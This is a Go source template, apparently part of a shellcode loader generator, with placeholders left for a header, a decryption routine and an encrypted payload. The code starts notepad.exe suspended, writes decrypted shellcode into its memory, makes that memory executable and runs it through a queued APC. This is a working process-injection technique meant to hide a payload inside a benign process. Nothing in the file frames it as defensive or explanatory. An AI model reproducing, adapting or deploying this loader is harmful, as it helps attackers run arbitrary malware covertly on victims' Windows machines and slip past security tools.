package main

import (
	"syscall"
	"unsafe"
	"time"
	{{header}}
)

const (
	CREATE_SUSPENDED = 0x00000004
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

{{decryption}}

const  PROGRAM = "C:\\Windows\\System32\\notepad.exe"

func Loader(shellcode []byte){
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
	ResumeThread := kernel32.NewProc("ResumeThread")
	procInfo := &syscall.ProcessInformation{}
	startupInfo := &syscall.StartupInfo{
		Flags:      syscall.STARTF_USESTDHANDLES | CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	appName,_ := syscall.UTF16PtrFromString(PROGRAM)
	appArgs,_ := syscall.UTF16PtrFromString("")
	syscall.CreateProcess(appName,appArgs,nil,nil,true,CREATE_SUSPENDED,nil,nil,startupInfo,procInfo)
	time.Sleep(5*time.Second)
	addr,_,_ := VirtualAllocEx.Call(uintptr(procInfo.Process),0,uintptr(len(shellcode)),MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE)
	WriteProcessMemory.Call(uintptr(procInfo.Process),addr,(uintptr)(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)),uintptr(0))
	protect := PAGE_READWRITE
	VirtualProtectEx.Call(uintptr(procInfo.Process),addr,uintptr(len(shellcode)),PAGE_EXECUTE_READ,uintptr(unsafe.Pointer(&protect)))
	QueueUserAPC.Call(addr,uintptr(procInfo.Thread),0)
	ResumeThread.Call(uintptr(procInfo.Thread))
	syscall.CloseHandle(procInfo.Process)
	syscall.CloseHandle(procInfo.Thread)
}

func main(){
     shellcode := Crypto("{{shellcode}}")
     Loader(shellcode)
}